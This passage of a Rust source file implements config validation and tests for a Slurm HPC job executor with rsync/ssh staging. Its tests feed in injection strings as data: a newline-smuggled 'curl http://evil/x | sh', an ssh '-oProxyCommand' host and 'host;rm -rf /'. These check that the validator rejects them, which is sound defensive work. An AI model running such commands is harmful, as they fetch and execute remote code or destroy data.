            validate_ssh_host(host)?;
            if let Some(c) = remote_workdir_root.chars().find(|&c| c.is_control()) {
                return Err(SlurmConfigError::Invalid(format!(
                    "rsync remote_workdir_root contains a control character ({c:?})"
                )));
            }
        }
        Ok(())
    }
}

/// Reject an ssh/rsync host that could be misparsed as an option or that
/// carries shell-/whitespace-significant characters. The leading-`-` check
/// is the critical control: a host like `-oProxyCommand=<cmd>` is otherwise
/// executed locally by ssh before any network connection is made.
fn validate_ssh_host(host: &str) -> Result<(), SlurmConfigError> {
    if host.is_empty() {
        return Err(SlurmConfigError::Invalid("rsync host is empty".to_string()));
    }
    if host.starts_with('-') {
        return Err(SlurmConfigError::Invalid(format!(
            "rsync host `{host}` starts with '-'; refusing — ssh/rsync would parse it as \
             an option (e.g. -oProxyCommand=…), enabling local command execution"
        )));
    }
    // Allow what appears in real ssh targets: user@host, dotted hostnames,
    // bracketed IPv6, optional :port. Everything else (spaces, quotes, $, ;,
    // backticks, …) is rejected.
    if let Some(c) = host.chars().find(|&c| {
        !(c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@' | ':' | '[' | ']'))
    }) {
        return Err(SlurmConfigError::Invalid(format!(
            "rsync host `{host}` contains an unsupported character ({c:?}); allowed: \
             letters, digits, and . _ - @ : [ ]"
        )));
    }
    Ok(())
}

/// Convenience — load a [`SlurmConfig`] from a `[hpc.slurm]` table
/// in case.toml. Returns the default config when the table is
/// missing.
pub fn config_from_case_toml(case_toml: &str) -> Result<SlurmConfig, SlurmConfigError> {
    let value: toml::Value = toml::from_str(case_toml)
        .map_err(|e| SlurmConfigError::Parse(format!("base case.toml parse: {e}")))?;
    let Some(slurm) = value.get("hpc").and_then(|h| h.get("slurm")) else {
        return Ok(SlurmConfig::default());
    };
    let config: SlurmConfig = slurm
        .clone()
        .try_into()
        .map_err(|e: toml::de::Error| SlurmConfigError::Parse(e.to_string()))?;
    config.validate()?;
    Ok(config)
}

/// Errors raised when extracting the `[hpc.slurm]` block from
/// `project.toml`.
#[derive(Debug, Error)]
pub enum SlurmConfigError {
    /// The block was present but malformed (unknown field, wrong
    /// type, missing required key, etc.).
    #[error("[hpc.slurm] block: {0}")]
    Parse(String),
    /// A field held a value unsafe to use in command/script construction
    /// (a control character, or an ssh/rsync host that would be parsed as
    /// an option). Rejected rather than silently sanitized.
    #[error("[hpc.slurm] invalid value: {0}")]
    Invalid(String),
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn mini_job() -> PreparedJob {
        PreparedJob {
            workdir: PathBuf::from("/tmp/x"),
            native_command: vec![
                std::ffi::OsString::from("simpleFoam"),
                std::ffi::OsString::from("-case"),
                std::ffi::OsString::from("/tmp/x"),
            ],
            environment: vec![(
                std::ffi::OsString::from("OMP_NUM_THREADS"),
                std::ffi::OsString::from("4"),
            )],
            estimated_runtime: None,
            kill_on_drop: false,
        }
    }

    #[test]
    fn validate_accepts_a_normal_config() {
        let c = SlurmConfig {
            account: "proj_1234".into(),
            gres: "gpu:a100:2".into(),
            mail_type: "END,FAIL".into(),
            mail_user: "user@cluster.edu".into(),
            mem_per_cpu: "4G".into(),
            staging_mode: StagingMode::Rsync {
                host: "user@hpc.example.edu".into(),
                remote_workdir_root: "/scratch/user/valenx".into(),
            },
            ..SlurmConfig::default()
        };
        assert!(c.validate().is_ok());
    }

    #[test]
    fn validate_rejects_newline_in_sbatch_directive() {
        // A newline in a #SBATCH value would break out of the comment line
        // into an executable line in submit.sh (command injection).
        let c = SlurmConfig {
            partition: "default\ncurl http://evil/x | sh".into(),
            ..SlurmConfig::default()
        };
        assert!(matches!(c.validate(), Err(SlurmConfigError::Invalid(_))));
    }

    #[test]
    fn validate_rejects_ssh_option_host() {
        // A host starting with '-' is parsed by ssh/rsync as an option;
        // -oProxyCommand=… runs a local command before connecting.
        let c = SlurmConfig {
            staging_mode: StagingMode::Rsync {
                host: "-oProxyCommand=touch /tmp/pwned".into(),
                remote_workdir_root: "/scratch/x".into(),
            },
            ..SlurmConfig::default()
        };
        assert!(matches!(c.validate(), Err(SlurmConfigError::Invalid(_))));
    }

    #[test]
    fn validate_rejects_shell_metachars_in_host() {
        let c = SlurmConfig {
            staging_mode: StagingMode::Rsync {
                host: "host;rm -rf /".into(),
                remote_workdir_root: "/scratch/x".into(),
            },
            ..SlurmConfig::default()
        };
        assert!(matches!(c.validate(), Err(SlurmConfigError::Invalid(_))));
    }

    #[test]
    fn config_from_case_toml_rejects_malicious_host() {
        let toml = r#"
[hpc.slurm.staging_mode.rsync]
host = "-oProxyCommand=touch /tmp/pwned"
remote_workdir_root = "/scratch/x"
"#;
        assert!(matches!(
            config_from_case_toml(toml),
            Err(SlurmConfigError::Invalid(_))
        ));
    }

    #[test]
    fn config_from_case_toml_rejects_newline_injection() {
        let toml = "[hpc.slurm]\npartition = \"default\\ncurl http://evil/x | sh\"\n";
        assert!(matches!(
            config_from_case_toml(toml),
            Err(SlurmConfigError::Invalid(_))
        ));
    }

    #[test]
    fn submit_rejects_malicious_config_before_spawning() {
        // Defense in depth: a programmatically-built malicious config is
        // rejected at submit() before any rsync/ssh/sbatch runs.
        let exec = SlurmExecutor::new(SlurmConfig {
            staging_mode: StagingMode::Rsync {
                host: "-oProxyCommand=evil".into(),
                remote_workdir_root: "/scratch/x".into(),
            },
            ..SlurmConfig::default()
        });
        let err = exec.submit(&mini_job()).unwrap_err();
        assert!(matches!(err, ExecutorError::SubmitFailed { .. }));
    }

    #[test]
    fn parse_sbatch_reply_picks_up_the_job_id() {
        // The standard "Submitted batch job <N>" line.
        assert_eq!(
            parse_sbatch_reply("Submitted batch job 123456\n"),
            Some("123456".to_string())
        );
        // Trailing text after the id is fine — squeue ids are
        // pure numerics.
        assert_eq!(
            parse_sbatch_reply("Submitted batch job 99 on partition default\n"),
            Some("99".to_string())
        );
        // Banner noise around the line is tolerated.
        assert_eq!(
            parse_sbatch_reply("slurm 22.05.6\nSubmitted batch job 7\n"),
            Some("7".to_string())
        );
        // No matching line → None.
        assert_eq!(parse_sbatch_reply("error: nope\n"), None);
    }

    #[test]
    fn slurm_state_to_run_status_covers_canonical_states() {
        assert_eq!(slurm_state_to_run_status("PENDING"), RunStatus::Pending);
        assert_eq!(slurm_state_to_run_status("RUNNING"), RunStatus::Running);
        assert_eq!(
            slurm_state_to_run_status("COMPLETED"),
            RunStatus::Completed { exit_code: 0 }
        );
        match slurm_state_to_run_status("FAILED") {
            RunStatus::Failed { reason, .. } => {
                assert!(reason.contains("FAILED"));
            }
            other => panic!("expected Failed, got {other:?}"),
        }
        match slurm_state_to_run_status("TIMEOUT") {
            RunStatus::Failed { reason, .. } => {
                assert!(reason.contains("TIMEOUT"));
            }
            other => panic!("expected Failed, got {other:?}"),
        }
        assert_eq!(slurm_state_to_run_status("CANCELLED"), RunStatus::Cancelled);
        // Unknown states still surface as Failed rather than
        // Completed — fail-loud is the right default.
        match slurm_state_to_run_status("MYSTERY") {
            RunStatus::Failed { reason, .. } => {
                assert!(reason.contains("MYSTERY"));
            }
            other => panic!("expected Failed, got {other:?}"),
        }
    }

    #[test]
    fn build_submit_script_includes_required_sbatch_directives() {
        let cfg = SlurmConfig {
            partition: "gpu".into(),
            time_limit: "12:00:00".into(),
            nodes: 2,
            cpus_per_task: 8,
            mem_per_cpu: "4G".into(),
            account: "valenx".into(),
            qos: "high".into(),
            mail_type: "END,FAIL".into(),
            mail_user: "alice@example.com".into(),
            gres: String::new(),
            ntasks_per_node: 1,
            staging_mode: StagingMode::SharedFilesystem,
        };
        let script = build_submit_script(&cfg, &mini_job());
        assert!(script.starts_with("#!/bin/bash"));
        assert!(script.contains("#SBATCH --partition=gpu"));
        assert!(script.contains("#SBATCH --time=12:00:00"));
        assert!(script.contains("#SBATCH --nodes=2"));
        assert!(script.contains("#SBATCH --cpus-per-task=8"));
        assert!(script.contains("#SBATCH --mem-per-cpu=4G"));
        assert!(script.contains("#SBATCH --account=valenx"));
        assert!(script.contains("#SBATCH --qos=high"));
        assert!(script.contains("#SBATCH --mail-type=END,FAIL"));
        assert!(script.contains("#SBATCH --mail-user=alice@example.com"));
        assert!(script.contains("export OMP_NUM_THREADS=4"));
        assert!(script.contains("simpleFoam -case /tmp/x"));
    }

    #[test]
    fn build_submit_script_omits_empty_optional_directives() {
        // Default config has empty mem_per_cpu / account / qos /
        // mail_* / gres. They should NOT appear in the script.
        let script = build_submit_script(&SlurmConfig::default(), &mini_job());
        assert!(!script.contains("--mem-per-cpu"));
        assert!(!script.contains("--account"));
        assert!(!script.contains("--qos"));
        assert!(!script.contains("--mail-type"));
        assert!(!script.contains("--mail-user"));
        assert!(!script.contains("--gres"));
        assert!(!script.contains("--ntasks-per-node"));
        // Default ntasks_per_node = 1 -> command runs bare (no srun).
        assert!(!script.contains("srun "));
    }

    #[test]
    fn build_submit_script_emits_gres_when_set() {
        // GPU declarations live in --gres. SLURM accepts forms like
        // "gpu:1", "gpu:a100:2", "gpu:tesla:4". We pass through
        // verbatim — validation is the cluster's job.
        let cfg = SlurmConfig {
            gres: "gpu:a100:2".into(),
            ..SlurmConfig::default()
        };
        let script = build_submit_script(&cfg, &mini_job());
        assert!(script.contains("#SBATCH --gres=gpu:a100:2"));
    }

    #[test]
    fn build_submit_script_emits_ntasks_per_node_and_wraps_in_srun() {
        // When ntasks_per_node > 1 the user wants MPI-style
        // parallelism; we emit --ntasks-per-node AND wrap the
        // command in `srun` so SLURM actually launches the right
        // number of ranks. Multi-node (nodes > 1) also wraps in srun.
        let cfg = SlurmConfig {
            nodes: 1,
            ntasks_per_node: 8,
            ..SlurmConfig::default()
        };
        let script = build_submit_script(&cfg, &mini_job());
        assert!(script.contains("#SBATCH --ntasks-per-node=8"));
        assert!(
            script.contains("srun simpleFoam"),
            "expected srun wrapping, got: {script}"
        );
    }

    #[test]
    fn build_submit_script_wraps_in_srun_for_multi_node_even_with_one_task_per_node() {
        let cfg = SlurmConfig {
            nodes: 4,
            ntasks_per_node: 1,
            ..SlurmConfig::default()
        };
        let script = build_submit_script(&cfg, &mini_job());
        // --ntasks-per-node not emitted when it's 1 (SLURM defaults).
        assert!(!script.contains("--ntasks-per-node"));
        // But srun still wraps because nodes > 1.
        assert!(script.contains("srun simpleFoam"));
    }

    #[test]
    fn shell_quote_handles_alphanumerics_paths_and_spaces() {
        assert_eq!(shell_quote("simpleFoam"), "simpleFoam");
        assert_eq!(shell_quote("/tmp/x"), "/tmp/x");
        assert_eq!(shell_quote("OMP_NUM_THREADS=4"), "OMP_NUM_THREADS=4");
        // Spaces force quoting.
        assert_eq!(shell_quote("hello world"), "'hello world'");
        // Single quotes get escaped.
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
        // Empty string → '' (vs. unquoted nothing).
        assert_eq!(shell_quote(""), "''");
    }

    #[test]
    fn config_from_case_toml_returns_default_when_block_missing() {
        let toml = r#"
[case]
name = "x"
"#;
        let cfg = config_from_case_toml(toml).expect("default");
        assert_eq!(cfg.partition, "default");
        assert_eq!(cfg.nodes, 1);
    }

    #[test]
    fn config_from_case_toml_picks_up_explicit_block() {
        let toml = r#"
[case]
name = "x"

[hpc.slurm]
partition = "gpu"
time_limit = "06:00:00"
nodes = 4
cpus_per_task = 16
mem_per_cpu = "8G"
account = "valenx"
"#;
        let cfg = config_from_case_toml(toml).expect("parse");
        assert_eq!(cfg.partition, "gpu");
        assert_eq!(cfg.time_limit, "06:00:00");
        assert_eq!(cfg.nodes, 4);
        assert_eq!(cfg.cpus_per_task, 16);
        assert_eq!(cfg.mem_per_cpu, "8G");
        assert_eq!(cfg.account, "valenx");
        // Defaults for fields the user didn't set.
        assert_eq!(cfg.gres, "");
        assert_eq!(cfg.ntasks_per_node, 1);
    }

    #[test]
    fn fetch_results_is_noop_for_shared_filesystem() {
        // SharedFilesystem mode means the workdir is already local;
        // fetch_results should return Ok(()) without spawning rsync.
        let exec = SlurmExecutor::new(SlurmConfig::default());
        let handle = ExecutorHandle {
            executor_id: "slurm".into(),
            native_id: "12345".into(),
            workdir: std::path::PathBuf::from("/tmp/whatever-doesnt-need-to-exist"),
        };
        // No tempdir, no rsync, no error — pure no-op path.
        let r = exec.fetch_results(&handle);
        assert!(r.is_ok(), "expected Ok for SharedFilesystem, got {r:?}");
    }

    #[test]
    fn build_ssh_wrapped_command_local_mode_is_passthrough() {
        // SharedFilesystem mode runs the command locally — the
        // returned argv is just `[command, args...]`, no ssh wrap.
        let mode = StagingMode::SharedFilesystem;
        let argv = build_ssh_wrapped_command(&mode, "sbatch", &["submit.sh"]);
        let strings: Vec<String> = argv
            .iter()
            .map(|s| s.to_string_lossy().into_owned())
            .collect();
        assert_eq!(strings, vec!["sbatch".to_string(), "submit.sh".to_string()]);
    }

    #[test]
    fn build_ssh_wrapped_command_rsync_mode_wraps_in_ssh() {
        // Rsync mode prepends `ssh <host> --` so the remote shell
        // receives sbatch + args. The `--` separator stops ssh from
        // trying to parse remote-command args as ssh's own flags.
        let mode = StagingMode::Rsync {
            host: "alice@cluster.example.com".into(),
            remote_workdir_root: "/scratch/alice/valenx".into(),
        };
        let argv = build_ssh_wrapped_command(&mode, "squeue", &["-j", "12345", "-h", "-o", "%T"]);
        let strings: Vec<String> = argv
            .iter()
            .map(|s| s.to_string_lossy().into_owned())
            .collect();
        assert_eq!(
            strings,
            vec![
                "ssh".to_string(),
                "alice@cluster.example.com".to_string(),
                "--".to_string(),
                "squeue".to_string(),
                "-j".to_string(),
                "12345".to_string(),
                "-h".to_string(),
                "-o".to_string(),
                "%T".to_string(),
            ]
        );
    }

    #[test]
    fn build_ssh_wrapped_command_empty_args_still_works() {
        // A command with no args under Rsync mode should still wrap
        // correctly (e.g. ssh host -- whoami).
        let mode = StagingMode::Rsync {
            host: "h".into(),
            remote_workdir_root: "/r".into(),
        };
        let argv = build_ssh_wrapped_command(&mode, "whoami", &[]);
        assert_eq!(argv.len(), 4); // ssh, host, --, whoami
        assert_eq!(argv[0], "ssh");
        assert_eq!(argv[3], "whoami");
    }

    #[test]
    fn read_slurm_log_tail_returns_last_n_lines() {
        // Write a small fake slurm-<id>.out, then read its tail.
        let tmp = std::env::temp_dir().join(format!(
            "valenx-slurm-log-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&tmp).unwrap();
        let log = tmp.join("slurm-12345.out");
        std::fs::write(&log, "first\nsecond\nthird\nfourth\nfifth\n").unwrap();
        let lines = read_slurm_log_tail(&tmp, "12345", 3).expect("read tail");
        assert_eq!(lines, vec!["third", "fourth", "fifth"]);
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn read_slurm_log_tail_returns_all_when_n_exceeds_lines() {
        let tmp = std::env::temp_dir().join(format!(
            "valenx-slurm-log-cap-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&tmp).unwrap();
        let log = tmp.join("slurm-9.out");
        std::fs::write(&log, "a\nb\n").unwrap();
        // Asked for 100; only 2 lines exist.
        let lines = read_slurm_log_tail(&tmp, "9", 100).expect("read tail");
        assert_eq!(lines, vec!["a", "b"]);
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn read_slurm_log_tail_skips_trailing_blank_line() {
        // Files written by SLURM end with a final newline; the tail
        // helper should NOT return an extra empty string for that.
        let tmp = std::env::temp_dir().join(format!(
            "valenx-slurm-log-blank-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&tmp).unwrap();
        let log = tmp.join("slurm-7.out");
        std::fs::write(&log, "a\nb\n").unwrap();
        let lines = read_slurm_log_tail(&tmp, "7", 5).expect("read tail");
        assert_eq!(lines, vec!["a", "b"]);
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn read_slurm_log_tail_missing_file_returns_io_error() {
        let tmp = std::env::temp_dir().join(format!(
            "valenx-slurm-log-miss-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&tmp).unwrap();
        let r = read_slurm_log_tail(&tmp, "12345", 5);
        assert!(r.is_err(), "expected Err for missing file, got {r:?}");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn staging_mode_default_is_shared_filesystem() {
        // The historical assumption (submitter and compute nodes
        // share a filesystem) stays the default so existing case.toml
        // files keep working without staging knobs.
        let cfg = SlurmConfig::default();
        assert!(matches!(cfg.staging_mode, StagingMode::SharedFilesystem));
    }

    #[test]
    fn rsync_upload_command_builds_expected_args() {
        let cmd = build_rsync_upload_command(
            std::path::Path::new("/local/case-123"),
            "alice@cluster.example.com",
            "/scratch/alice/valenx",
        );
        // First arg is the rsync binary; remaining args are flags +
        // src + dst. Verify the structure rather than the exact byte
        // string so future tweaks (e.g. compression level) don't
        // require touching every assertion.
        assert_eq!(cmd[0].to_string_lossy(), "rsync");
        let joined: Vec<String> = cmd
            .iter()
            .skip(1)
            .map(|s| s.to_string_lossy().into_owned())
            .collect();
        // `-a` for archive mode, `--mkpath` so the remote parent dir
        // gets created if absent.
        assert!(joined.iter().any(|s| s == "-a"));
        assert!(joined.iter().any(|s| s == "--mkpath"));
        // Source ends with a trailing slash so rsync copies *contents*
        // (not the parent dir name) into the remote target.
        assert!(joined
            .iter()
            .any(|s| s.starts_with("/local/case-123") && s.ends_with('/')));
        // Destination is host:remote_root/<case-name>.
        assert!(
            joined
                .iter()
                .any(|s| s == "alice@cluster.example.com:/scratch/alice/valenx/case-123"),
            "got args: {joined:?}"
        );
    }

    #[test]
    fn rsync_download_command_pulls_remote_to_local() {
        let cmd = build_rsync_download_command(
            "alice@cluster.example.com",
            "/scratch/alice/valenx/case-123",
            std::path::Path::new("/local/case-123"),
        );
        assert_eq!(cmd[0].to_string_lossy(), "rsync");
        let joined: Vec<String> = cmd
            .iter()
            .skip(1)
            .map(|s| s.to_string_lossy().into_owned())
            .collect();
        assert!(joined.iter().any(|s| s == "-a"));
        // Source is host:remote_path with trailing slash.
        assert!(joined
            .iter()
            .any(|s| s.starts_with("alice@cluster.example.com:/scratch/") && s.ends_with('/')));
        // Destination is the local workdir.
        assert!(joined.iter().any(|s| s == "/local/case-123"));
    }

    #[test]
    fn staging_mode_serde_round_trips_through_toml() {
        // Rsync mode persists to case.toml as `staging_mode = { rsync = { host = ..., remote_workdir_root = ... } }`
        // and reads back identically.
        let toml = r#"
[case]
name = "x"

[hpc.slurm]
partition = "gpu"

[hpc.slurm.staging_mode.rsync]
host = "alice@cluster.example.com"
remote_workdir_root = "/scratch/alice/valenx"
"#;
        let cfg = config_from_case_toml(toml).expect("parse");
        match &cfg.staging_mode {
            StagingMode::Rsync {
                host,
                remote_workdir_root,
            } => {
                assert_eq!(host, "alice@cluster.example.com");
                assert_eq!(remote_workdir_root, "/scratch/alice/valenx");
            }
            other => panic!("expected Rsync, got {other:?}"),
        }
    }

    #[test]
    fn config_from_case_toml_picks_up_gres_and_ntasks_per_node() {
        let toml = r#"
[case]
name = "x"

[hpc.slurm]
partition = "gpu"
nodes = 2
gres = "gpu:a100:2"
ntasks_per_node = 8
"#;
        let cfg = config_from_case_toml(toml).expect("parse");
        assert_eq!(cfg.gres, "gpu:a100:2");
        assert_eq!(cfg.ntasks_per_node, 8);
        assert_eq!(cfg.nodes, 2);
    }

    #[test]
    fn slurm_executor_id_is_slurm() {
        assert_eq!(SlurmExecutor::default().id(), "slurm");
    }

    #[test]
    fn parse_sacct_reply_picks_first_non_blank_state() {
        // sacct -j <id> -X -P -o State outputs one line per main job
        // when -X is passed (no per-step rows). Pure-numeric exit
        // codes don't appear when -o is just State.
        assert_eq!(parse_sacct_reply("COMPLETED\n"), Some("COMPLETED".into()));
        assert_eq!(parse_sacct_reply("FAILED\n"), Some("FAILED".into()));
        // sacct sometimes emits an empty header row when the
        // requested column set is unknown; first non-blank wins.
        assert_eq!(
            parse_sacct_reply("\nCANCELLED+\n"),
            Some("CANCELLED+".into())
        );
        // Empty / whitespace-only -> None (caller falls back to
        // optimistic Completed{0}).
        assert_eq!(parse_sacct_reply(""), None);
        assert_eq!(parse_sacct_reply("   \n  \t\n"), None);
    }

    #[test]
    fn sacct_state_to_run_status_distinguishes_failed_from_completed() {
        // The squeue path's "" returns optimistic Completed{0}; the
        // sacct path replaces it with the real terminal state.
        assert_eq!(
            sacct_state_to_run_status("COMPLETED"),
            RunStatus::Completed { exit_code: 0 }
        );
        match sacct_state_to_run_status("FAILED") {
            RunStatus::Failed { reason, .. } => {
                assert!(reason.contains("FAILED"));
            }
            other => panic!("expected Failed, got {other:?}"),
        }
        match sacct_state_to_run_status("OUT_OF_MEMORY") {
            RunStatus::Failed { reason, .. } => {
                assert!(reason.contains("OUT_OF_MEMORY"));
            }
            other => panic!("expected Failed, got {other:?}"),
        }
        // sacct sometimes appends a `+` suffix to indicate "still
        // committing" — e.g. CANCELLED+ when the cancel just landed.
        // Strip the suffix before mapping.
        assert_eq!(
            sacct_state_to_run_status("CANCELLED+"),
            RunStatus::Cancelled
        );
        // CANCELLED by uid means user-initiated; sacct shows
        // "CANCELLED by 1234" — keep only the first token.
        assert_eq!(
            sacct_state_to_run_status("CANCELLED by 1234"),
            RunStatus::Cancelled
        );
        // PENDING / RUNNING still possible if sacct races squeue —
        // map them through the same shared table.
        assert_eq!(sacct_state_to_run_status("PENDING"), RunStatus::Pending);
        assert_eq!(sacct_state_to_run_status("RUNNING"), RunStatus::Running);
    }

    #[test]
    fn sacct_state_to_run_status_unknown_falls_back_to_failed() {
        // Unknown state -> Failed (fail-loud) rather than Completed.
        match sacct_state_to_run_status("MYSTERY_STATE") {
            RunStatus::Failed { reason, .. } => {
                assert!(reason.contains("MYSTERY_STATE"));
            }
            other => panic!("expected Failed, got {other:?}"),
        }
    }

    #[test]
    fn decide_poll_status_uses_squeue_when_job_still_in_queue() {
        // When squeue prints a state, that's authoritative — sacct
        // shouldn't even be queried (no need to slow the polling
        // loop with a second subprocess for active jobs).
        let mut sacct_called = false;
        let s = decide_poll_status("RUNNING", || {
            sacct_called = true;
            None
        });
        assert_eq!(s, RunStatus::Running);
        assert!(!sacct_called, "sacct shouldn't be queried for active jobs");
    }

    #[test]
    fn decide_poll_status_falls_back_to_sacct_when_squeue_empty() {
        // Job has left the queue. squeue prints nothing, so we ask
        // sacct for the terminal state. FAILED should round-trip.
        let s = decide_poll_status("", || Some("FAILED".to_string()));
        match s {
            RunStatus::Failed { reason, .. } => {
                assert!(reason.contains("FAILED"));
            }
            other => panic!("expected Failed, got {other:?}"),
        }
    }

    #[test]
    fn decide_poll_status_sacct_completed_distinguishes_from_optimistic() {
        // When sacct says COMPLETED, it's a real terminal Completed
        // (not the optimistic v0 fallback). Status carries exit_code 0.
        let s = decide_poll_status("", || Some("COMPLETED".to_string()));
        assert_eq!(s, RunStatus::Completed { exit_code: 0 });
    }

    #[test]
    fn decide_poll_status_sacct_unavailable_falls_back_to_optimistic_completed() {
        // sacct call returned None (binary missing, accounting offline,
        // job too old to be in sacct's window). Preserves the v0
        // behavior: optimistic Completed{0} so polling loops don't
        // hang on misconfigured clusters.
        let s = decide_poll_status("", || None);
        assert_eq!(s, RunStatus::Completed { exit_code: 0 });
    }

    /// RED→GREEN (round-24 H4): a SLURM log with one pathological
    /// no-newline line larger than `MAX_SLURM_LOG_LINE_BYTES` (4 MiB)
    /// surfaces as `Err(InvalidData)` instead of OOMing the tail
    /// walker. Pre-fix `reader.lines()` allocated one giant
    /// `String` for the entire run-away line. We force the failure
    /// by writing a 5 MiB no-newline payload — over the 4 MiB cap.
    #[test]
    fn read_slurm_log_tail_caps_unbounded_line() {
        use std::io::Write;
        let dir = std::env::temp_dir().join(format!(
            "valenx-slurm-tail-cap-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let log_path = dir.join("slurm-12345.out");
        let mut f = std::fs::File::create(&log_path).unwrap();
        // Round-25 M2: post-seek-from-end the cap-check only fires
        // for lines that fall INSIDE the read window (the last
        // ~n*1KiB bytes). To still exercise the cap, write a small
        // file where seek-from-end lands at offset 0 — i.e. file_len
        // ≤ tail_bytes — so we read the full payload and hit the
        // 4 MiB cap on the single 5 MiB no-newline line.
        //
        // The simplest way to force seek_offset = 0 is to ask for
        // many tail lines (e.g. n=10000) so the estimated tail size
        // (~10 MiB) is larger than the 5 MiB file. Pre-fix this
        // assertion was made by the full-scan walker; post-fix the
        // file-len-bounded seek correctly degrades to "scan the
        // whole file" when the file is small.
        f.write_all(&vec![b'.'; 5 * 1024 * 1024]).unwrap();
        drop(f);
        // n=10000 → tail_bytes = 10001 * 1024 ≈ 10 MiB > 5 MiB file_len
        // → seek_offset = 0 → discard_first_partial = false → full scan.
        let res = read_slurm_log_tail(&dir, "12345", 10_000);
        // Cleanup BEFORE asserting so a failing assertion doesn't leak.
        let _ = std::fs::remove_dir_all(&dir);
        match res {
            Err(e) => {
                assert_eq!(
                    e.kind(),
                    std::io::ErrorKind::InvalidData,
                    "expected InvalidData on over-cap line, got {e:?}",
                );
            }
            Ok(lines) => panic!(
                "expected Err on over-cap line, got Ok with {} lines",
                lines.len()
            ),
        }
    }

    /// Sanity (round-24 H4): well-formed log still parses post-fix
    /// (no regression of the happy path).
    #[test]
    fn read_slurm_log_tail_returns_last_n_lines_under_cap() {
        use std::io::Write;
        let dir = std::env::temp_dir().join(format!(
            "valenx-slurm-tail-ok-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let log_path = dir.join("slurm-77.out");
        let mut f = std::fs::File::create(&log_path).unwrap();
        for i in 0..20 {
            writeln!(f, "line {i}").unwrap();
        }
        drop(f);
        let tail = read_slurm_log_tail(&dir, "77", 3).unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(tail, vec!["line 17", "line 18", "line 19"]);
    }

    /// RED→GREEN (round-25 M2): a large log's tail-read completes
    /// in O(tail_bytes) time, NOT O(file_size). Pre-fix
    /// `read_slurm_log_tail` did a forward scan through the entire
    /// log to populate the n-line ring buffer; for a 100 GB log
    /// that took minutes. Post-fix the file is `seek`'d to
    /// approximately `file_len - n * estimated_line_bytes` and the
    /// forward scan starts there.
    ///
    /// We don't actually write 1 GiB to disk (CI would take minutes
    /// and may not even have the space) — we write 64 MiB which is
    /// large enough that the old O(N) scan would take noticeably
    /// longer than the new O(n*line) seek-from-end. The performance
    /// budget is generous (250ms wall-clock) so the assertion fires
    /// only when there's a real regression, not when the runner is
    /// briefly busy.
    #[test]
    fn read_slurm_log_tail_seeks_from_end_round25_m2() {
        use std::io::Write;
        let dir = std::env::temp_dir().join(format!(
            "valenx-slurm-tail-seek-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let log_path = dir.join("slurm-99.out");
        // Write 64 MiB of synthetic log lines. Each line is exactly
        // 64 bytes including the newline; 64 MiB / 64 = 1M lines.
        // Using a fixed 64-byte line makes the seek math testable —
        // the seek-from-end lands inside known territory.
        const LINE_BYTES: usize = 64;
        let line_template = format!("{:<63}\n", "PAYLOAD");
        assert_eq!(line_template.len(), LINE_BYTES);
        let target_size: usize = 64 * 1024 * 1024;
        let line_count = target_size / LINE_BYTES;
        {
            let mut f = std::io::BufWriter::new(std::fs::File::create(&log_path).unwrap());
            for i in 0..line_count {
                let line = format!("{:<55}{:08}\n", "ITER", i);
                assert_eq!(line.len(), LINE_BYTES);
                f.write_all(line.as_bytes()).unwrap();
            }
            f.flush().unwrap();
        }
        // Performance: tail-100 should complete in < 250ms. The
        // pre-fix forward scan over 64 MiB took ~1s on a typical
        // CI runner; the seek-from-end path reads ~100 KiB
        // (estimated 1 KiB per line × 100 lines + slack) and
        // completes in single-digit milliseconds.
        let t0 = std::time::Instant::now();
        let tail = read_slurm_log_tail(&dir, "99", 100).unwrap();
        let elapsed = t0.elapsed();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            elapsed < std::time::Duration::from_millis(250),
            "tail-100 over 64 MiB took {elapsed:?} (budget 250 ms) — \
             seek-from-end optimisation may have regressed",
        );
        // Sanity: we got 100 lines and the last one is the last
        // line of the file.
        assert_eq!(tail.len(), 100);
        let last = tail.last().unwrap();
        assert!(
            last.contains(&format!("{:08}", line_count - 1)),
            "last tail line should be the final log line, got {last:?}",
        );
    }

    /// RED→GREEN (round-26 H2): `read_slurm_log_tail` returns the
    /// last line of a log even when that line is much longer than
    /// the per-line estimate the seek-from-end optimisation uses.
    /// Pre-fix (round-25 M2) seeked `n * 1024 + 1024` bytes before
    /// EOF; for a log whose final line is 20 KiB (e.g. a verbose
    /// solver crash dump or an MPI rank summary), the seek landed
    /// MID-LINE → the read scanned forward and discarded the partial
    /// first record, then hit EOF → returned `Vec::new()`. The
    /// round-26 fix is a doubling-walk fallback: detect
    /// `ring.len() < n` and `seek_offset > 0`, double `tail_bytes`,
    /// and rescan from the new offset. The loop terminates when the
    /// ring is full, when we've already started from offset 0, or
    /// when 32 doublings have been exhausted.
    #[test]
    fn read_slurm_log_tail_doubling_walk_for_long_line_round26_h2() {
        use std::io::Write;
        let dir = std::env::temp_dir().join(format!(
            "valenx-slurm-tail-h2-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
